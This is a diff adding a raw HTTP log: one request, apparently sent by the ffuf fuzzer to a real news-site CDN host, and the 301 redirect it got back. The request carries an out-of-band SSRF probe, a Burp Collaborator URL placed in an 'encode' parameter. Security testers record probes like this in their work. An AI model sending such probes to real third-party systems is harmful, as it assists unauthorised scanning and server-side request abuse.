@@ -1,0 +1,27 @@
+GET /?encode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net HTTP/1.1
+Host: cmp.cdn.thesun.co.uk
+User-Agent: Fuzz Faster U Fool v1.2.0-git
+Accept-Encoding: gzip
+
+
+---- ↑ Request ---- Response ↓ ----
+
+HTTP/1.1 301 Moved Permanently
+Content-Length: 183
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 17 Apr 2021 08:06:56 GMT
+Location: https://cmp.cdn.thesun.co.uk/?encode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net
+Server: CloudFront
+Via: 1.1 b2912c462b2f3621a395cbfc629da2e5.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: sUXkqGxFyxXeCOHHwgcImoVJ-1zhp-u8vdXfeM9bU72Kuw52owa5ng==
+X-Amz-Cf-Pop: SIN52-C2
+X-Cache: Redirect from cloudfront
+
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body bgcolor="white">
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>CloudFront</center>
+</body>
+</html>
